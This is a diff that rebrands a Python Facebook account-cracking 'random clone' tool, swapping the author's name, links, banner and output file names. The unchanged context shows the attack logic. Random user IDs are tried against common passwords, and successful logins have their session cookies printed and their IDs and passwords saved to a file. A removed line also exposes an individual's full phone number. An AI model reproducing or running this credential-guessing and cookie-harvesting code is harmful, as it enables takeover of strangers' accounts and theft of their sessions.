@@ -1,7 +1,7 @@
 #-----SCRIPT---INFORMETION-----------#
-#_ ADMIN [] MOHAMMED TUHIN 
-#CREATED BY  []  MOHAMMED TUHIN 
-#FACEBOOK [] IT'S TUHIN YT 
+#_ ADMIN [] Tushar Ahmed
+#CREATED BY  []  Tushar Ahmed
+#FACEBOOK [] Tushar Ahmed Viper
 #TOOLS RANDOM CLONE
 #TAKE LOVE FROM ME 
 #1K SPECIAL GIFT 
@@ -54,10 +54,10 @@ def ALEX():
     if opt == '1':
         main()
     if None == '2':
-        os.system('xdg-open https://www.facebook.com/TUHIN-ABBA100k ')
+        os.system('xdg-open https://www.facebook.com/tushar100k ')
         return None
     if None == '3':
-        os.system('xdg-open https://github.com/TUHIN-ABBA695/ ')
+        os.system('xdg-open https://github.com/tushar695/ ')
         return None
     if None == 'E':
         os.system('exit')
@@ -130,22 +130,35 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.001)
 
-logo ="""\033[1;91m MOHAMMED TUHIN TOMAR-ABBA
+logo ="""\033[1;91m 𝗧𝗨𝗦𝗛𝗔𝗥 𝗔𝗛𝗠𝗘𝗗 𝗩𝗜𝗣𝗘𝗥
 \033[1;92m 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦
 \033[1;93m 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗔𝗡𝗗 𝗚𝗘𝗧 𝗜𝗗𝗦
 \033[1;94m 𝗗𝗢𝗡'𝗧 𝗙𝗨𝗖𝗞 𝗜𝗡𝗡𝗢𝗖𝗘𝗡𝗧 𝗣𝗘𝗢𝗣𝗟𝗘
 \033[1;95m 𝗘𝗡𝗝𝗢𝗬 𝗙𝗨𝗖𝗞𝗜𝗡𝗚 𓀐	𓂸 \033[1;92m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [√] AUTHOR    \033[1;91m: \033[1;92mMOHAMMAD TUHIN  ┃
+ ┃ [√] AUTHOR    \033[1;91m: \033[1;92mTUSHAR AHMED  ┃
  ┃ [√] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
  ┃ [√] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
  ┃ [√] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [√] GITHUB    \033[1;91m: \033[1;92mTUHIN-143                   ┃
- ┃ [√] FACEBOOK  \033[1;91m: \033[1;92mMOHAMMAD TUHIN  ┃
- ┃ [√] WHATSAPP  \033[1;91m: \033[1;92m+8801992913606            ┃
+ ┃ [√] GITHUB    \033[1;91m: \033[1;92mtushar6953                   ┃
+ ┃ [√] FACEBOOK  \033[1;91m: \033[1;92mTUSHAR AHMED VIPER  ┃
+ ┃ [√] WHATSAPP  \033[1;91m: \033[1;92m+880132636**22             ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
 
- 
+khld = """\033[1;91m 𝗧𝗨𝗦𝗛𝗔𝗥 𝗔𝗛𝗠𝗘𝗗 𝗩𝗜𝗣𝗘𝗥
+\033[1;92m 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦
+\033[1;93m 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗔𝗡𝗗 𝗚𝗘𝗧 𝗜𝗗𝗦
+\033[1;94m 𝗗𝗢𝗡'𝗧 𝗙𝗨𝗖𝗞 𝗜𝗡𝗡𝗢𝗖𝗘𝗡𝗧 𝗣𝗘𝗢𝗣𝗟𝗘
+\033[1;95m 𝗘𝗡𝗝𝗢𝗬 𝗙𝗨𝗖𝗞𝗜𝗡𝗚 𓀐	𓂸  \033[1;92m
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃ [√] AUTHOR    \033[1;91m: \033[1;92mTUSHAR AHMED  ┃
+ ┃ [√] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
+ ┃ [√] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
+ ┃ [√] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
+ ┃ [√] GITHUB    \033[1;91m: \033[1;92mtushar6953                   ┃
+ ┃ [√] FACEBOOK  \033[1;91m: \033[1;92mTUSHAR AHMED VIPER  ┃
+ ┃ [√] WHATSAPP  \033[1;91m: \033[1;92m+880132636**22             ┃
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
 def main():
     user=[]
     os.system('clear')
@@ -175,7 +188,7 @@ def main():
 		    pwx = [guru, 'bangladesh','Bangladesh','i love you','I Love You',]
 		    yaari.submit(rcrack,uid,pwx,tl)
     print('\nCRACK PROCESS HAS BEEN COMPLETED ')
-    print('\nIDS SAVED IN ABBA-OK.txt')
+    print('\nIDS SAVED IN GIFT-OK.txt')
     print(54*'─')
 
 agents=[]
@@ -228,9 +241,9 @@ def rcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\r\r \033[1;32m[TUHIN-ABBA-OK💋]  '+uid+'|'+ps+'>'+   '  \n \033[1;34m[COOKIE \033[1;91m[𓀐🤫] = \033[1;94m'+coki+  ' \n\033[1;95m')
+				print('\r\r \033[1;32m[TUSHAR-OK💋]  '+uid+'|'+ps+'>'+   '  \n \033[1;34m[COOKIE \033[1;91m[𓀐🤫] = \033[1;94m'+coki+  ' \n\033[1;95m')
 				cek_apk(session,coki)
-				open('/sdcard/TUHIN-ABBA-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/TUSHAR-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			else:
